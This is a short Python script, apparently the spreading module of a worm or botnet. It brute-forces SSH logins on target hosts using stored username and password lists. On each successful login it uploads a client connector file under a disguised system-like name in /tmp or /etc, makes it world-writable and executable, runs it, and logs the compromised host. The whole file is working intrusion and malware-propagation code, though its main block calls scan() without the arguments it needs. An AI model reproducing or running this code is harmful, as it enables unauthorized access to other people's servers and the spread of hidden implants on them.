#!/usr/bin/python

import paramiko
import os

usernaem_list=[]
passwd_list=[]

for passwd in file('./configuration/passwd.txt'):
    passwd_list.append(passwd)
for usernaem in file('./configuration/username.txt'):
    usernaem_list.append(usernaem)

def scan(target_host,search_results):
    global passwd_list
    global usernaem_list
    while not target_host.empty():
        target_info=target_host.get()
        if target_info[1]!=22:
            target_host.put(target_info)
            continue
        ssh_client=paramiko.SSHClient()
        ssh_client.load_system_host_keys()
        for usernaem in usernaem_list:
            for passwd in passwd_list:
                try:
                    ssh_client.connect(str(target_info[0]),int(target_info[1]),username=usernaem,password=passwd)
                except:
                    continue
                else:
                    try:
                        trans_port=paramiko.Transport(str(target_info[0]),int(target_info[1]))
                        trans_port.connect(username=usernaem,password=passwd)
                        sftp_client=paramiko.SFTPClient.from_transport(trans_port)
                        current_path='./client_controller/client_connector.py'
                        try:
                            sftp_client.put(localpath=current_path,remotepath='/tmp/syslog_reload.py')
                        except:
                            sftp_client.put(localpath=current_path,remotepath='/etc/http_server_reload.py')
                        else:
                            pass
                    except:
                        continue
                    else:
                        try:
                            ssh_client.exec_command('chmod 777 /tmp/syslog_reload.py ; /tmp/syslog_reload.py')
                        except:
                            ssh_client.exec_command('chmod 777 /etc/http_server_reload.py ; /etc/http_server_reload.py')

                        search_results.put(target_info)
                        ssh_client.close()
                        sftp_client.close()


if __name__ == '__main__':
    scan()